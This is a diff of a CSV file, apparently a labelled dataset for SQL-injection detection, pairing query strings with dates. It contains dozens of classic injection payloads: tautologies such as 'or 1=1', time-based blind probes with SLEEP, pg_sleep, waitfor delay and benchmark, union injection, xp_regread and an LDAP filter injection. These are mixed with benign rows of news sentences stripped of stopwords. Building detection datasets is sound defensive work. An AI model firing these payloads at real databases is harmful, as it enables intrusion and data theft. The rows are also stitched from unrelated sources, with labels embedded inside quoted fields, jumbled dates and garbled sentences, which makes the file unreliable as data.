@@ -1,8 +1,57 @@
 Queries,Date
-OR SLEEP(5),01/01/2006
-select,03/01/2006
-And 1=1,02/01/2006
-hello my name is,05/01/2006
-or' 1=1,05/01/2006
-admin,03/01/2006
-server,03/01/2006
+OR SLEEP(5),2016-01-17
+select,2016-01-18
+And 1=1,2016-01-03
+hello my name is,2016-01-14
+or' 1=1,2016-01-17
+admin,2016-01-17
+server,2016-01-06
+Where does it come from?,2016-01-25
+sections 1.10.32 and 1.10.33,2016-01-21
+"injected humour,",2016-01-10
+UPDATE,2016-01-27
+"a,1",2016-01-18
+"a' ,1",2016-01-17
+"a' --,1",2016-01-02
+"a' or 1 = 1; --,1",2002-05-03
+"@,1",2002-05-06
+"?,1",2002-05-04
+"' and 1 = 0 )  union all,1",2002-05-10
+"? or 1 = 1 --,1",2002-05-01
+"x' and userid is NULL; --,1",2002-05-05
+" However , regard winning run , Rangnick sang team &apos;s praises ,0",2002-05-04
+" &quot; There two words it: Really good , &quot; stated ,0",2002-05-04
+" There lot criticise ,0",2002-05-08
+" Most , manner team playing impressive ,0",2002-05-09
+" We must stay composed keep ,0",2002-05-07
+" There hardly squad changes winter transfer window ,0",2002-05-10
+" There major reason change anything ,0",2002-05-10
+" &quot; Unless player comes forward expresses desire leave club , &quot; explained Rangnick ,0",2002-05-09
+" Tripodi denies influenced Obeid Former NSW Labor minister Joe Tripodi investigated state &apos;s corruption watchdog ,0",2002-05-06
+" Former NSW minister Joe Tripodi denied changing maritime leases policy request political mentor Eddie Obeid , hidden interests three properties government-controlled land ,0",2002-05-07
+" The Independent Commission Against Corruption (ICAC) Friday widened inquiry whether Mr Obeid lobbied several state ministers leases Circular Quay , Obeids owned two restaurants cafe , renewed without going tender expiration August 2005 ,0",2002-05-09
+" It &apos;s investigating allegations Mr Tripodi knew Mr Obeid &apos;s secret interest properties , evidence given Mr Tripodi &apos;s former deputy chief staff , Lynne Ashpole , Thursday ,0",2002-05-09
+" During years discussions starting 2005 government pushing leases go public tender ,0",2002-05-04
+" The lessees also wanted longer terms ,0",2002-05-02
+" In 2009 leases Circular Quay enterprises , earned Obeids $ 2,0",2002-05-10
+"1  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #,1",2002-05-07
+"asc,1",2018-08-20
+" ( ||6 ) ,1",2018-08-12
+"""a"""" or 3 = 3--"",1",2018-08-31
+""" or benchmark ( 10000000,MD5 ( 1  )  )  #,1",2018-08-30
+"# from wapiti,1",2018-08-13
+" or 0 = 0 --,1",2018-08-09
+"1 waitfor delay '0:0:10'--,1",2018-08-18
+"delete,1",2018-08-21
+"like,1",2018-08-21
+""" or sleep ( __TIME__ ) #,1",2018-08-15
+"pg_sleep ( __TIME__ ) --,1",2018-08-13
+"* ( | ( objectclass = *  )  )  ,1",2018-08-14
+"declare @q nvarchar  ( 200 )  0x730065006c00650063 ...,1",2018-08-08
+" or 0 = 0 #,1",2018-08-17
+"insert,1",2018-08-23
+"1 )  or sleep ( __TIME__ ) #,1",2018-08-10
+" )  or  ( 'a' = 'a,1",2018-08-23
+"; exec xp_regread,1",2018-08-16
+"*|,1",2018-08-09
+"@var select @var as var into temp end --,1",2018-08-03
